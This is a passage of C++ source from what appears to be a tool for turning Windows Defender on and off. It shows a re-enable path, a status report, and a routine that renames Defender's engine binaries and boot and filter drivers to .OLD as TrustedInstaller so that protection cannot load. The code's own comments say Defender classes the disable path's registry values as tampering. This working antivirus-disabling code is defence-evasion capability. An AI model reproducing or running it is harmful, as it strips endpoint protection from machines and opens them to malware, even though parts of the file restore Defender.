      if (!reg::set_keyval(hkey, L"DisableAntiSpyware", 0))
        printf("Failed to write to DisableAntiSpyware\n");
    }
    else
      printf("Failed to access Windows Defender\n");

    // Protected by anti-tamper
    // Start (3 off) (2 on)
    if (reg::create_registry(L"SYSTEM\\CurrentControlSet\\Services\\WinDefend", hkey))
      reg::set_keyval(hkey, L"Start", 2);
    else
      printf("Failed to access CurrentControlSet\n");

    // Protected by anti-tamper
    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", hkey))
    {
      if (!reg::set_keyval(hkey, L"DisableRealtimeMonitoring", 0))
        printf("Failed to write to DisableRealTimeMonitoring\n");
    }
    else
      printf("Failed to access Real-Time Protection");

    auto helper = new wmic::helper(
      "Root\\Microsoft\\Windows\\Defender",
      "MSFT_MpPreference",
      "Set"
    );

    if (helper->get_last_error())
    {
      // The MSFT_MpPreference provider needs the engine running. If Defender is
      // currently broken/stopped this fails - that is expected. We skip the live
      // preference reset (it applies once the engine is back) and continue with the
      // ownership/registration repair, which is what actually gets Defender running.
      printf("Defender WMI provider unavailable (engine not running) - skipping live\n"
             "preference reset; it will apply after Defender restarts.\n");
      delete helper;
      helper = nullptr;
    }

    if (helper)
    {
      // BSTR types
      helper->execute("EnableControlledFolderAccess", "Enabled");
      helper->execute("PUAProtection", "enable");

      auto helper_disable = [](wmic::helper* h, const char* name) {
        h->execute<BOOL>(name, wmic::variant_type::t_bool, FALSE);
      };

      // BOOL types
      helper_disable(helper, "DisableRealtimeMonitoring");
      helper_disable(helper, "DisableBehaviorMonitoring");
      helper_disable(helper, "DisableBlockAtFirstSeen");
      helper_disable(helper, "DisableIOAVProtection");
      helper_disable(helper, "DisablePrivacyMode");
      helper_disable(helper, "SignatureDisableUpdateOnStartupWithoutEngine");
      helper_disable(helper, "DisableArchiveScanning");
      helper_disable(helper, "DisableIntrusionPreventionSystem");
      helper_disable(helper, "DisableScriptScanning");
      helper_disable(helper, "DisableAntiSpyware");
      helper_disable(helper, "DisableAntiVirus");

      // Cleanup
      delete helper;
    }

    // Offline-only fixes that the live (WMI/MpCmdRun) path cannot do on a broken
    // engine. All are idempotent / skip-if-correct, so they are harmless on a
    // healthy machine. Must run BEFORE ownership is handed back to TrustedInstaller.
    clear_tampering_values();
    reset_tamper_protection();

    HKEY hwd;
    if (reg::create_registry(L"SYSTEM\\CurrentControlSet\\Services\\WinDefend", hwd))
      reg::set_keyval(hwd, L"Start", 2);

    recreate_mpdefendercoreservice();
    restore_wdboot_group();

    // Restore key ownership and have Defender re-register its services/platform.
    // This is the step that actually recovers a Defender broken by a disable cycle.
    repair_defender_registration();

    // Try to bring the AV service up now. Boot-start drivers (WdBoot/WdFilter) only
    // load at boot, so a live start may still fail until the user reboots.
    if (!start_service_nothrow("WinDefend"))
      printf("WinDefend could not start yet - a REBOOT is required to finish enabling Defender.\n");

    manage_security_center(true);

    return true;
  }

  // Clear the per-feature "Disable*" values the disable path wrote under Real-Time
  // Protection. These are exactly what Defender flags as
  // VirTool:Win32/DefenderTamperingRestore. Deleting them returns each feature to its
  // default (enabled). Offline-safe (pure registry).
  //
  static void clear_tampering_values()
  {
    printf("Clearing Real-Time Protection tampering values...\n");

    HKEY hkey;
    if (reg::create_registry(
      L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", hkey))
    {
      const wchar_t* values[] = {
        L"DisableRealtimeMonitoring",
        L"DisableBehaviorMonitoring",
        L"DisableOnAccessProtection",
        L"DisableScanOnRealtimeEnable",
        L"DisableIOAVProtection",
        L"DisableScriptScanning",
        L"DisableIntrusionPreventionSystem",
        L"DisableInformationProtectionControl",
        L"DisableRawWriteNotification",
      };
      for (auto& v : values)
        reg::delete_value(hkey, v);
    }
  }

  // Reset Features\TamperProtection, which a disable cycle can leave in an odd state
  // (e.g. 4 with TamperProtectionSource=2). 0 = off/not-configured; dropping the
  // Source lets Defender recompute it on next start. Offline-safe.
  //
  static void reset_tamper_protection()
  {
    printf("Resetting Tamper Protection state...\n");

    HKEY hkey;
    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows Defender\\Features", hkey))
    {
      reg::set_keyval(hkey, L"TamperProtection", 0);
      reg::delete_value(hkey, L"TamperProtectionSource");
    }
  }

  // Recreate the MpDefenderCoreService registration when it has been deregistered
  // (its absence stops MsMpEng coming up cleanly). The service exe lives under the
  // resolved platform folder; we read InstallLocation rather than hardcoding a
  // version. NOTE: the exact stock service definition (DisplayName/SDDL/deps) is not
  // public - these are the minimal functional values and may differ slightly from a
  // pristine install.
  //
  static void recreate_mpdefendercoreservice()
  {
    if (service_key_exists(L"MpDefenderCoreService"))
      return;

    std::wstring install;
    if (!reg::read_string(L"SOFTWARE\\Microsoft\\Windows Defender", L"InstallLocation", install)
        || install.empty())
    {
      printf("  Cannot recreate MpDefenderCoreService: InstallLocation unknown.\n");
      return;
    }

    if (install.back() != L'\\')
      install += L'\\';
    std::wstring exe = install + L"MpDefenderCoreService.exe";

    if (GetFileAttributesW(exe.c_str()) == INVALID_FILE_ATTRIBUTES)
    {
      printf("  Cannot recreate MpDefenderCoreService: exe not found at platform path.\n");
      return;
    }

    HKEY hkey;
    if (!reg::create_registry(
      L"SYSTEM\\CurrentControlSet\\Services\\MpDefenderCoreService", hkey))
    {
      printf("  Failed to create MpDefenderCoreService key.\n");
      return;
    }

    std::wstring image = L"\"" + exe + L"\"";
    reg::set_keyval_expand_sz(hkey, L"ImagePath", image.c_str());
    reg::set_keyval_sz(hkey, L"ObjectName", L"LocalSystem");
    reg::set_keyval_sz(hkey, L"DisplayName", L"Microsoft Defender Core Service");
    reg::set_keyval(hkey, L"Type", 0x10);          // SERVICE_WIN32_OWN_PROCESS
    reg::set_keyval(hkey, L"Start", 2);            // auto-start
    reg::set_keyval(hkey, L"ErrorControl", 1);     // normal
    reg::set_keyval(hkey, L"LaunchProtected", 3);  // PPL antimalware-light (like WinDefend)

    printf("  Recreated MpDefenderCoreService -> %ls\n", exe.c_str());
  }

  // Restore the WdBoot ELAM driver's load-order group.
  //
  // Background: a broken WdBoot Group (e.g. "_Early-Launch" instead of "Early-Launch")
  // makes the boot loader skip the ELAM driver (System log Event 7026), so MsMpEng cannot
  // complete its protected antimalware-PPL launch and WinDefend times out during init
  // (SCM 7000/7009, 45s) while logging nothing.
  //
  // IMPORTANT (learned the hard way): this value is kernel-locked by WdFilter while it is
  // loaded and CANNOT be written live by anyone -- not Administrators, not SYSTEM, and not
  // even TrustedInstaller (we run as TI; the write still returns ACCESS_DENIED). The
  // reliable approach never writes Group directly; it re-enables the surrounding
  // state (service Start values, file restores, policies, tamper protection) and lets the
  // Defender platform RE-REGISTER and normalise WdBoot's service key itself once the engine
  // can run. So: attempt the write as TI (cheap if it is ever allowed, e.g. Safe Mode/WinRE
  // where WdFilter is not loaded), but treat failure as non-fatal -- it is expected live.
  //
  // Do NOT take_ownership here: changing the owner to Administrators is itself a tamper that
  // SFC/DISM flag, and it does not beat a kernel callback (which ignores DACL/owner). We are
  // already TrustedInstaller; write directly.
  //
  static void restore_wdboot_group()
  {
    printf("Checking WdBoot ELAM load-order group...\n");

    const wchar_t* sub = L"SYSTEM\\CurrentControlSet\\Services\\WdBoot";

    std::wstring group;
    reg::read_string(sub, L"Group", group);
    if (group == L"Early-Launch")
    {
      printf("  WdBoot Group already correct (Early-Launch).\n");
      return;
    }

    HKEY hkey;
    bool ok = reg::create_registry(sub, hkey)
              && reg::set_keyval_sz(hkey, L"Group", L"Early-Launch");

    if (ok)
    {
      printf("  WdBoot Group: '%ls' -> 'Early-Launch'\n",
             group.empty() ? L"(missing)" : group.c_str());
    }
    else
    {
      printf("  WdBoot Group is '%ls' and is kernel-locked by WdFilter (cannot write\n",
             group.empty() ? L"(missing)" : group.c_str());
      printf("  live). Defender will re-register it once the engine starts; if it does\n");
      printf("  not, set it to 'Early-Launch' from Safe Mode / WinRE (no WdFilter there).\n");
    }
  }

  // Returns true if RealTimeMonitoring is activated
  //
  bool check_defender(uint32_t flags)
  {
    // Unreliable method if anti-tamper is enabled.
    //return REG::read_key(
    //  L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
    //  L"DisableRealtimeMonitoring") == 0;

    auto helper = new wmic::helper(
      "Root\\Microsoft\\Windows\\Defender",
      "MSFT_MpPreference",
      "Set"
    );

    if (auto error = helper->get_last_error())
    {
      // MSFT_MpPreference is only queryable when the engine is live. If the query
      // fails, WinDefend/MsMpEng is not running, so Defender is NOT active. Returning
      // true here was the bug behind the false "Windows defender is currently ACTIVE"
      // banner on a broken/disabled machine.
      delete helper;
      return false;
    }

    bool result = false;
    helper->get<bool>("DisableRealtimeMonitoring", wmic::variant_type::t_bool, result);
    delete helper;
    return (!result);
  }

  // Print a human-readable Defender status report.
  //
  void report_status()
  {
    printf("==== Windows Defender status ====\n\n");

    bool av = false, rtp = false, tp = false, behavior = false;
    bool wmi_ok = false;

    auto helper = new wmic::helper(
      "Root\\Microsoft\\Windows\\Defender",
      "MSFT_MpComputerStatus",
      "Get");

    if (!helper->get_last_error())
    {
      wmi_ok = true;
      helper->get<bool>("AntivirusEnabled", wmic::variant_type::t_bool, av);
      helper->get<bool>("RealTimeProtectionEnabled", wmic::variant_type::t_bool, rtp);
      helper->get<bool>("IsTamperProtected", wmic::variant_type::t_bool, tp);
      helper->get<bool>("BehaviorMonitorEnabled", wmic::variant_type::t_bool, behavior);

      printf("  WMI (MSFT_MpComputerStatus):\n");
      printf("    Antivirus enabled      : %s\n", av ? "YES" : "no");
      printf("    Real-time protection   : %s\n", rtp ? "YES" : "no");
      printf("    Behavior monitoring    : %s\n", behavior ? "YES" : "no");
      printf("    Tamper Protection      : %s\n", tp ? "ON" : "off");

      bstr_t mode;
      if (helper->get("AMRunningMode", wmic::variant_type::t_bstr, mode) && mode.length())
        printf("    AM running mode        : %ls\n", (const wchar_t*)mode);
    }
    else
    {
      printf("  WMI status unavailable (error %d).\n", helper->get_last_error());
      printf("  (Defender's WMI provider may itself be disabled - often a good sign.)\n");
    }
    delete helper;

    // Process + service + registry facts (independent of WMI)
    bool msmpeng = util::get_pid("MsMpEng.exe") != (DWORD)-1;

    auto wd_start = reg::read_key(
      L"SYSTEM\\CurrentControlSet\\Services\\WinDefend", L"Start");
    const char* wd_start_str =
      wd_start == 4 ? "disabled" :
      wd_start == 3 ? "manual" :
      wd_start == 2 ? "automatic" :
      wd_start == 0 ? "boot" : "unknown/unreadable";

    auto pol_as = reg::read_key(
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", L"DisableAntiSpyware");

    printf("\n  System facts:\n");
    printf("    MsMpEng.exe running    : %s\n", msmpeng ? "YES" : "no");
    printf("    WinDefend service Start: %d (%s)\n", (int)wd_start, wd_start_str);
    printf("    Policy DisableAntiSpyware: %s\n",
      pol_as == 1 ? "1 (set)" : pol_as == (DWORD)-1 ? "(not set)" : "0");

    // Overall verdict
    printf("\n  Verdict: ");
    if (!msmpeng && wd_start == 4)
      printf("DISABLED (service stopped and set to disabled)\n");
    else if (wmi_ok && !av)
      printf("DISABLED (antivirus reports not enabled)\n");
    else if (wmi_ok && !rtp)
      printf("PARTIALLY DISABLED (real-time protection is off)\n");
    else if (!wmi_ok && !msmpeng)
      printf("LIKELY DISABLED (engine not running, WMI provider gone)\n");
    else
      printf("ACTIVE / still running\n");

    printf("\n");
  }

  // ==========================================================================
  // Binary soft-deletion
  // ==========================================================================

  // Suffix appended to soft-deleted binaries. The common ".OLD" convention makes a
  // renamed file self-describing and recognisable by the restore path.
  static const wchar_t* DC_OLD_SUFFIX = L".OLD";

  // Expand %ENV% style strings to an absolute path.
  //
  static std::wstring expand_env(const wchar_t* s)
  {
    wchar_t buf[1024];
    DWORD n = ExpandEnvironmentStringsW(s, buf, _countof(buf));
    return (n > 0 && n <= _countof(buf)) ? std::wstring(buf) : std::wstring(s);
  }

  // Directory holding our restore manifest (outside the Defender dir so it survives).
  //
  static std::wstring manifest_dir()
  {
    std::wstring dir = expand_env(L"%ProgramData%\\defender-control");
    CreateDirectoryW(dir.c_str(), nullptr); // best-effort
    return dir;
  }

  static std::wstring manifest_path()
  {
    return manifest_dir() + L"\\soft-deleted.txt";
  }

  // Build the list of Defender binaries to soft-delete, resolving the live platform
  // version path (never hardcode the version - it changes between updates).
  //
  static std::vector<std::wstring> build_target_list()
  {
    std::vector<std::wstring> dirs;

    // The active engine runs from the versioned Platform dir (InstallLocation).
    std::wstring platform;
    if (reg::read_string(L"SOFTWARE\\Microsoft\\Windows Defender", L"InstallLocation", platform)
        && !platform.empty())
    {
      if (platform.back() == L'\\') platform.pop_back();
      dirs.push_back(platform);
    }

    dirs.push_back(expand_env(L"%ProgramFiles%\\Windows Defender"));
    dirs.push_back(expand_env(L"%ProgramFiles%\\Windows Defender\\Offline"));

    const wchar_t* engine_files[] = {
      L"MsMpEng.exe", L"MpDefenderCoreService.exe", L"NisSrv.exe", L"MpCmdRun.exe",
      L"MpClient.dll", L"MpSvc.dll", L"MpRtp.dll", L"MpOav.dll", L"MpProvider.dll",
      L"MpEngine.dll", L"mpengine.dll", L"ProtectionManagement.dll", L"MpAzSubmit.dll",
    };

    std::vector<std::wstring> targets;
    for (auto& d : dirs)
      for (auto& f : engine_files)
        targets.push_back(d + L"\\" + f);

    // Boot / minifilter drivers (renaming the ELAM driver is what actually stops the
    // protected engine launching at boot).
    std::wstring drv = expand_env(L"%SystemRoot%\\System32\\drivers");
    const wchar_t* driver_files[] = {
      L"WdFilter.sys", L"WdBoot.sys", L"WdNisDrv.sys", L"WdDevFlt.sys",
    };
    for (auto& f : driver_files)
      targets.push_back(drv + L"\\" + f);

    // The ELAM backup copy.
    targets.push_back(expand_env(L"%SystemRoot%\\ELAMBKUP\\WdBoot.sys"));

    return targets;
  }

  // Rename src -> dst, taking ownership first. If the live rename is blocked (file
  // locked without share-delete), schedule it for the next reboot. Returns true if the
  // rename happened or was scheduled.
  //
  static bool rename_with_ownership(const std::wstring& src, const std::wstring& dst)
  {
    reg::file_take_ownership(src.c_str());

    if (MoveFileExW(src.c_str(), dst.c_str(), MOVEFILE_REPLACE_EXISTING))
      return true;

    // Locked live -> apply at next boot (before the file is opened).
    if (MoveFileExW(src.c_str(), dst.c_str(),
          MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT))
    {
      printf("  (scheduled for next reboot) %ls\n", src.c_str());
      return true;
    }
    return false;
  }

  // Soft-delete (rename to .OLD) Defender's binaries. Writes a manifest first so the
  // restore path is reliable even if interrupted.
  //
  void soft_delete_binaries()
  {
    printf("Soft-deleting Defender binaries (rename to .OLD as TrustedInstaller)...\n");

    auto targets = build_target_list();

    // Open the manifest for append BEFORE renaming (durability).
    FILE* mf = nullptr;
    _wfopen_s(&mf, manifest_path().c_str(), L"a, ccs=UTF-8");

    int renamed = 0, missing = 0, failed = 0;
    for (auto& orig : targets)
    {
      if (GetFileAttributesW(orig.c_str()) == INVALID_FILE_ATTRIBUTES)
      {
        missing++;
        continue;
      }

      std::wstring dst = orig + DC_OLD_SUFFIX;

      // Record the intent first so restore can find it even on a crash.
      if (mf) { fwprintf(mf, L"%ls\n", orig.c_str()); fflush(mf); }

      if (rename_with_ownership(orig, dst))
      {
        printf("  renamed: %ls\n", orig.c_str());
        renamed++;
      }
      else
      {
        printf("  FAILED:  %ls (err %lu)\n", orig.c_str(), GetLastError());
        failed++;
      }
    }

    if (mf) fclose(mf);

    printf("Soft-delete summary: %d renamed, %d not present, %d failed.\n",
           renamed, missing, failed);
    printf("REBOOT to complete the disable - the running engine stays in memory until then.\n");
  }

  // Strip a trailing ".OLD" (case-insensitive) from a path. Returns false if absent.
  //
  static bool strip_old_suffix(const std::wstring& in, std::wstring& out)
  {
    size_t suf = wcslen(DC_OLD_SUFFIX);
    if (in.size() <= suf) return false;
    if (_wcsicmp(in.c_str() + (in.size() - suf), DC_OLD_SUFFIX) != 0) return false;
    out = in.substr(0, in.size() - suf);
    return true;
  }

  // Rename a single ".OLD" file back to its original name and restore TI ownership.
  //
  static bool restore_one(const std::wstring& orig)
  {
    std::wstring old = orig + DC_OLD_SUFFIX;
    if (GetFileAttributesW(old.c_str()) == INVALID_FILE_ATTRIBUTES)
      return false; // nothing to restore

    reg::file_take_ownership(old.c_str());

    bool ok = MoveFileExW(old.c_str(), orig.c_str(), MOVEFILE_REPLACE_EXISTING) != 0;
    if (!ok)
      ok = MoveFileExW(old.c_str(), orig.c_str(),
             MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT) != 0;

    if (ok)
    {
      reg::file_restore_owner_trustedinstaller(orig.c_str());
      printf("  restored: %ls\n", orig.c_str());
    }
    else
      printf("  FAILED to restore: %ls (err %lu)\n", orig.c_str(), GetLastError());
    return ok;
  }

  // Scan a directory for *.OLD files and restore each (manifest-loss fallback).
  //
  static void restore_scan_dir(const std::wstring& dir)
  {
    std::wstring pattern = dir + L"\\*" + DC_OLD_SUFFIX;
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(pattern.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do
    {
      if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
      std::wstring full = dir + L"\\" + fd.cFileName;
      std::wstring orig;
      if (strip_old_suffix(full, orig))
        restore_one(orig);
    } while (FindNextFileW(h, &fd));

    FindClose(h);
  }

  // Restore every soft-deleted binary: replay the manifest, then scan the known dirs
  // as a fallback so we recover even if the manifest was lost.
  //
  void restore_binaries()
  {
    printf("Restoring soft-deleted Defender binaries...\n");

    int from_manifest = 0;

    // 1. Manifest replay (precise).
    FILE* mf = nullptr;
    if (_wfopen_s(&mf, manifest_path().c_str(), L"r, ccs=UTF-8") == 0 && mf)
    {
      wchar_t line[1024];
      while (fgetws(line, _countof(line), mf))
      {
        std::wstring orig(line);
        while (!orig.empty() && (orig.back() == L'\n' || orig.back() == L'\r'))
          orig.pop_back();
        if (orig.empty()) continue;
        if (restore_one(orig)) from_manifest++;
      }
      fclose(mf);
    }

    // 2. Scan fallback across all known dirs (covers manifest loss / partial runs).
    auto dirs = std::vector<std::wstring>{
      expand_env(L"%ProgramFiles%\\Windows Defender"),
      expand_env(L"%ProgramFiles%\\Windows Defender\\Offline"),
      expand_env(L"%SystemRoot%\\System32\\drivers"),
      expand_env(L"%SystemRoot%\\ELAMBKUP"),
    };
    std::wstring platform;
    if (reg::read_string(L"SOFTWARE\\Microsoft\\Windows Defender", L"InstallLocation", platform)
        && !platform.empty())
    {
      if (platform.back() == L'\\') platform.pop_back();
      dirs.push_back(platform);
    }
    for (auto& d : dirs)
      restore_scan_dir(d);

    // 3. Manifest consumed - remove it so a later disable starts clean.
    DeleteFileW(manifest_path().c_str());

    printf("Restore complete (%d from manifest + any found by scan). REBOOT to finish.\n",
           from_manifest);
  }
}